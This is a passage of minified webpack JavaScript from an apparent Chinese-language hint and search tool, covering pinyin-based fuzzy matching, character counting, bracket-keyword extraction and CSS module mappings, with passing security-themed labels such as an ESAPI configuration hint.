Security\uFF09\uFF0C\u4E00\u4E9B\u914D\u7F6E\u6587\u4EF6",koans_\u63D0\u793A:["\u3010ESAPI.properties\u3011\uFF0C\u3010OWASP Enterprise Security API\u3011\u76F8\u5173\u7684\u914D\u7F6E\u6587\u4EF6","\u5176\u5B83\u4E00\u4E9B\u2026\u2026\u2026\u2026"]}].concat(n)},qhoQ:function(P,g,F){"use strict";F.d(g,"b",function(){return p}),F.d(g,"c",function(){return h}),F.d(g,"a",function(){return x});var O=F("jrin"),D=F("k1fw"),t=F("oBTY"),n=F("fWQN"),v=F("mtLc"),u=F("ty9a"),s=F.n(u),S=F("nE81"),i=F("Erke"),p=function(){function b(){Object(n.a)(this,b)}return Object(v.a)(b,null,[{key:"\u5904\u7406\u591A\u97F3\u5B57____\u5927\u5C0F\u5199\u654F\u611F",value:function(r){for(var C=arguments.length,A=new Array(C>1?C-1:0),B=1;B<C;B++)A[B-1]=arguments[B];var e=s.a.spell.apply(s.a,[r,"array","poly"].concat(A)),a=e.map(function(c){var w=c.match(/[^()|]+/g);return w===null?[c]:w}),m=i.c.apply(void 0,Object(t.a)(a));return m.map(function(c){return c.join("")})}},{key:"getPinYin_Spell____\u5927\u5C0F\u5199\u654F\u611F",value:function(r){return{pinyin_arr:this.\u5904\u7406\u591A\u97F3\u5B57____\u5927\u5C0F\u5199\u654F\u611F(r),firstPinyin_arr:this.\u5904\u7406\u591A\u97F3\u5B57____\u5927\u5C0F\u5199\u654F\u611F(r,"first","low")}}},{key:"_check_\u5305\u542B\u4E2D\u6587\u548C\u4E2D\u6587\u7684\u591A\u97F3\u5B57_\u662F\u5426\u5305\u542B____\u5185\u90E8\u5DF2\u5904\u7406\u5927\u5C0F\u5199",value:function(r,C){var A=this,B=this.getPinYin_Spell____\u5927\u5C0F\u5199\u654F\u611F(C),e=B.pinyin_arr,a=e.some(function(m){return A._check_\u662F\u5426\u5305\u542B_\u975E\u8FDE\u7EED\u6BD4\u8F83_\u4E2D\u95F4\u53EF\u6709\u5176\u5B83\u5B57\u7B26____\u5185\u90E8\u5DF2\u5904\u7406\u5927\u5C0F\u5199(r,[m])});return a}},{key:"_check_\u662F\u5426\u5305\u542B_\u975E\u8FDE\u7EED\u6BD4\u8F83_\u4E2D\u95F4\u53EF\u6709\u5176\u5B83\u5B57\u7B26____\u5185\u90E8\u5DF2\u5904\u7406\u5927\u5C0F\u5199",value:function(r,C){return Object(S.a)(C,r,!0).length>0}}]),b}(),h={\u751F\u6D3B\u6587\u672C_\u81EA\u52A8:!0,\u6E17\u900F\u9776\u673A_\u81EA\u52A8:!0},x=function(){function b(){Object(n.a)(this,b)}return Object(v.a)(b,null,[{key:"\u5904\u7406\u62FC\u97F3\u90E8\u5206_key\u5C06\u4F1A\u81EA\u52A8\u8F6C\u5316\u4E3A\u5C0F\u5199",value:function(r){var C=this,A=r.reduce(function(B,e){var a=e.toLowerCase();if(C.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD[a]!==void 0)return B;var m=p.getPinYin_Spell____\u5927\u5C0F\u5199\u654F\u611F(a),c=m.pinyin_arr,w=m.firstPinyin_arr,L=c.map(function(N){return N.toLowerCase()}),W=w.map(function(N){return N.toLowerCase()});return Object(D.a)(Object(D.a)({},B),{},Object(O.a)({},a,{raw_\u4FDD\u7559\u5927\u5C0F\u5199:e,raw_lower:a,pinyin_str_arr_lower:L,firstPinyin_str_arr_lower:W}))},{});this.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD=Object(D.a)(Object(D.a)({},this.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD),A)}},{key:"\u6BD4\u8F83_\u8FDE\u7EED\u62FC\u97F3",value:function(r,C){var A,B,e,a,m=((A=this.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD)===null||A===void 0||(B=A[r])===null||B===void 0?void 0:B.pinyin_str_arr_lower)||[],c=((e=this.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD)===null||e===void 0||(a=e[C])===null||a===void 0?void 0:a.pinyin_str_arr_lower)||[];return m.find(function(w){return c.find(function(L){return w.includes(L)})})!==void 0}},{key:"\u6BD4\u8F83_\u62FC\u97F3\u9996\u5B57\u6BCD",value:function(r,C){var A,B,e,a,m=((A=this.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD)===null||A===void 0||(B=A[r])===null||B===void 0?void 0:B.firstPinyin_str_arr_lower)||[],c=((e=this.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD)===null||e===void 0||(a=e[C])===null||a===void 0?void 0:a.firstPinyin_str_arr_lower)||[];return m.find(function(w){return c.find(function(L){return w.includes(L)})})!==void 0}},{key:"\u4EFB\u610F\u6BD4\u8F83_\u901A\u8FC7\u7B2C\u4E09\u65B9\u5E93\u5224\u65AD",value:function(r,C){var A,B,e,a,m=((A=this.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD)===null||A===void 0||(B=A[r])===null||B===void 0?void 0:B.pinyin_str_arr_lower)||[],c=((e=this.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD)===null||e===void 0||(a=e[C])===null||a===void 0?void 0:a.pinyin_str_arr_lower)||[];return c.find(function(w){var L=Object(S.a)(m,w);return L.length>0})!==void 0}},{key:"\u8BA1\u7B97__\u4E2D\u6587_\u82F1\u6587__\u4E0D\u540C\u7684\u957F\u5EA6",value:function(r){for(var C=0,A=0,B=0,e=0,a=0;a<r.length;a++){var m=r.charAt(a);(m.match(/[\u4e00-\u9fa5]/)||m.match(/[\u9FA6-\u9fcb]/))&&C++,m.match(/[^\x00-\xff]/)?A++:B++,m.match(/[0-9]/)&&e++}var c=C,w=c-A,L=e,W=L+c,N=A-c,X=B-L,K=c*2+N*2+B;return{\u4E2D\u6587\u6C49\u5B57\u6570:c,\u4E2D\u6587\u5168\u89D2\u6807\u70B9:w,\u6570\u5B57:L,\u4E2D\u6587\u5185\u5BB9\u603B\u6570___\u6C49\u5B57\u52A0\u6570\u5B57:W,\u4E2D\u6587_\u6807\u70B9:N,\u7EAF\u82F1\u6587\u5B57\u6BCD:X,ASCII\u5B57\u7B26\u603B\u6570:K}}}]),b}();x.pinyin_map__\u4E13\u7528\u4E8E\u7591\u96BE\u6742\u75C7_\u7EDF\u4E00\u5171\u7528\u4E00\u4EFD={}},siMk:function(P,g,F){P.exports={resultList_Item:"resultList_Item___6m1VJ",forceRemove_notificationCloseIcon:"forceRemove_notificationCloseIcon___3YNKU"}},thHx:function(P,g,F){P.exports={circleSketchHighlight:"circleSketchHighlight___2qnX-"}},vhfr:function(P,g,F){"use strict";F.d(g,"a",function(){return O});function O(){return function(D){}}},yvwo:function(P,g,F){P.exports={"ant-pro-menu-item-title":"ant-pro-menu-item-title___1mblt","ant-menu-item":"ant-menu-item___3Mgb7","ant-menu-submenu-title":"ant-menu-submenu-title___2LpSZ",koanList:"koanList___11yjA",ftDrawer:"ftDrawer___1xnqD",quickBtns:"quickBtns___HlLsS",doc:"doc___3d_zx",subDesc:"subDesc___Gby9d",toolList:"toolList___3E-b4",toolFlags:"toolFlags___3kDtQ",combined_searchCp:"combined_searchCp___3gdCg"}},z0Yr:function(P,g,F){"use strict";F.d(g,"a",function(){return s});var O=F("k1fw"),D=F("oBTY"),t=F("fWQN"),n=F("mtLc"),v=F("ysNt"),u=F("E3zn"),s=function(){function S(){Object(t.a)(this,S)}return Object(n.a)(S,null,[{key:"_\u7EDF\u4E00\u8FDB\u884C\u63D0\u53D6____\u6839\u636E\u65B9\u6846\u6B63\u5219____\u62FF\u5230\u5FC5\u8981\u7684\u6240\u6709\u8D44\u6599\u540E",value:function(p){var h=S._\u6839\u636E_\u5404\u79CD\u63D0\u53D6\u51FA\u7684\u6587\u672C_\u5E26_\u624B\u52A8\u65B9\u6846\u6B63\u5219____\u8FDB\u884C\u6B63\u5219\u5339\u914D_\u7136\u540E\u5F97\u51FA\u6807\u51C6Bean(p),x=S._\u63D0\u53D6\u51FA_\u4E00\u7EC4\u5BF9\u8C61\u4E2D\u7684_\u6240\u6709\u65B9\u6846\u5173\u952E\u5B57(h);return{_\u6B63\u5219\u5173\u952E\u5B57_BeanMap:h,_\u6B63\u5219\u5173\u952E\u5B57_\u5B57\u7B26\u4E32Arr:x}}},{key:"_\u63D0\u53D6\u51FA_\u4E00\u7EC4\u5BF9\u8C61\u4E2D\u7684_\u6240\u6709\u65B9\u6846\u5173\u952E\u5B57",value:function(p){return u.a.noRepeat_rtnNew(p.reduce(function(h,x){return[].concat(Object(D.a)(x.relatedKeys_\u76F8\u5173\u65B9\u6846\u5173\u952E\u5B57),Object(D.a)(h))},[]))}},{key:"_\u6839\u636E_\u5404\u79CD\u63D0\u53D6\u51FA\u7684\u6587\u672C_\u5E26_\u624B\u52A8\u65B9\u6846\u6B63\u5219____\u8FDB\u884C\u6B63\u5219\u5339\u914D_\u7136\u540E\u5F97\u51FA\u6807\u51C6Bean",value:function(p){var h=p.map(function(x){var b=x._\u7528\u6237\u8F93\u5165\u7EAFtext_\u4E2D\u95F4\u6B63\u6587_\u53EF\u80FD\u624B\u52A8\u65B9\u6846\u6B63\u5219,E=x._\u6765\u81EA\u667A\u80FD\u6B65\u9AA4\u7684\u6587\u672C_\u4E2D\u95F4\u53EF\u80FD\u5728\u6807\u9898_\u624B\u52A8\u65B9\u6846\u6B63\u5219,r=x.components,C=/【([^】]*)】/igm,A=[].concat(Object(D.a)(b.matchAll(C)),Object(D.a)(E.matchAll(C))),B=A.map(function(e){var a=e[1];if(a.length===0)throw new Error(`\u6709\u4E00\u6761\uFF0C\u6B63\u5219\u5339\u914D\u8BCD\u4E3A\u3010\u7A7A\u5B57\u7B26\u4E32\u3011\u7684\u6761\u76EE
`.concat(b,`
          `).concat(e,`
          \u4EE5\u53CA\uFF0C\u6CE8\u610F\uFF0C\u53EF\u80FD\u6709\u3010SmartCfg\u3011\u7684 cfg\u3010name\u3011\u5B57\u6BB5`));return a.toLowerCase()});if(!(B.length>0))throw new Error(`\u6709\u4E00\u6761\uFF0C\u6B63\u5219\u5339\u914D\u8BCD \u6570\u91CF\u4E3A\u30100\u3011\u7684\u6761\u76EE
`.concat(b));return S._\u62FC\u63A5\u6210Bean({components:r,_\u7528\u6237\u8F93\u5165\u7EAFtext_\u4E2D\u95F4\u6B63\u6587_\u53EF\u80FD\u624B\u52A8\u65B9\u6846\u6B63\u5219:b,_\u65B9\u6846\u5173\u952E\u5B57arr_\u65B9\u6846\u5339\u914D\u5230\u7684:B})});return h}},{key:"_\u62FC\u63A5\u6210Bean",value:function(p){var h=p.components,x=p._\u7528\u6237\u8F93\u5165\u7EAFtext_\u4E2D\u95F4\u6B63\u6587_\u53EF\u80FD\u624B\u52A8\u65B9\u6846\u6B63\u5219,b=p._\u65B9\u6846\u5173\u952E\u5B57arr_\u65B9\u6846\u5339\u914D\u5230\u7684,E={simple_name:x,question:[x],answer:[x],\u76F8\u5173\u7EC4\u4EF6:h,relatedKeys_\u76F8\u5173\u65B9\u6846\u5173\u952E\u5B57:b},r={name_\u6682\u65F6\u6CA1\u7528\u5230_\u5185\u90E8\u4F7F\u7528:E.simple_name,koans_\u63D0\u793A:E.answer,desc:E.simple_name.split(`
`)[1]||"\uFF08\u7B2C\u4E00\u884C\u672A\u627E\u5230\uFF09",keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5:v.l.get_regex_fromArrKeywords(E.relatedKeys_\u76F8\u5173\u65B9\u6846\u5173\u952E\u5B57.map(function(C){return C.valueOf()}))};return Object(O.a)(Object(O.a)({},E),r)}}]),S}()}}]);
